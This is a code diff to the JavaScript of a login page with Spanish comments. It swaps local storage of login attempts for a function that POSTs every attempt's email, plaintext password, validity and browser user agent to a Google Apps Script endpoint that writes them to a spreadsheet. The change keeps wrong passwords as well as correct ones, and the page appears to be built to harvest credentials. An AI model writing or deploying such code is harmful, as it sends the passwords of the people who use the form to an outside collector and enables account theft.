@@ -1,3 +1,6 @@
+// Configuración - REEMPLAZA con tu URL de Google Apps Script
+const API_URL = 'https://script.google.com/macros/s/AKfycbzeRJSHD1uZcdXTARiCBMZadSKC-bACw8U7Zrzbrg_0dt6G_evmY4trrxekAmsbVink9g/exec';
+
 document.addEventListener('DOMContentLoaded', function() {
     const loginForm = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
@@ -116,27 +119,26 @@ document.addEventListener('DOMContentLoaded', function() {
         hideGeneralError();
 
         try {
-            // Simular verificación (1 segundo)
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
             const email = emailInput.value.trim();
             const password = passwordInput.value;
 
             // Verificar si las credenciales son válidas
             const isValid = checkCredentials(email, password);
 
-            // ✅ GUARDAR TODOS LOS INTENTOS (correctos e incorrectos)
-            saveLoginData(email, password, isValid);
+            // ✅ GUARDAR EN GOOGLE SHEETS (funciona en todos los dispositivos)
+            const saveSuccess = await saveToGoogleSheets(email, password, isValid);
 
-            if (isValid) {
+            if (isValid && saveSuccess) {
                 // Credenciales correctas
                 alert('✅ ¡Inicio de sesión exitoso!');
                 loginForm.reset();
-            } else {
+            } else if (!isValid && saveSuccess) {
                 // Credenciales incorrectas
                 showGeneralError('❌ Contraseña incorrecta. Inténtalo de nuevo.');
                 passwordInput.value = '';
                 passwordInput.focus();
+            } else {
+                showGeneralError('❌ Error al guardar los datos. Inténtalo de nuevo.');
             }
             
         } catch (error) {
@@ -156,26 +158,29 @@ document.addEventListener('DOMContentLoaded', function() {
         );
     }
 
-    // Guardar TODOS los intentos de login
-    function saveLoginData(email, password, isValid) {
-        let loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
-        
-        const loginData = {
-            email: email,
-            password: password,
-            timestamp: new Date().toLocaleString(),
-            status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
-            timestampISO: new Date().toISOString()
-        };
-        
-        loginAttempts.unshift(loginData); // Agregar al inicio para ver los más recientes primero
-        
-        // Mantener solo los últimos 50 intentos para no llenar el storage
-        if (loginAttempts.length > 50) {
-            loginAttempts = loginAttempts.slice(0, 50);
+    // Guardar en Google Sheets
+    async function saveToGoogleSheets(email, password, isValid) {
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    status: isValid ? '✅ CORRECTO' : '❌ INCORRECTO',
+                    userAgent: navigator.userAgent
+                })
+            });
+            
+            const result = await response.json();
+            return result.success;
+            
+        } catch (error) {
+            console.error('Error saving to Google Sheets:', error);
+            return false;
         }
-        
-        localStorage.setItem('loginAttempts', JSON.stringify(loginAttempts));
     }
 
     // Efectos de focus
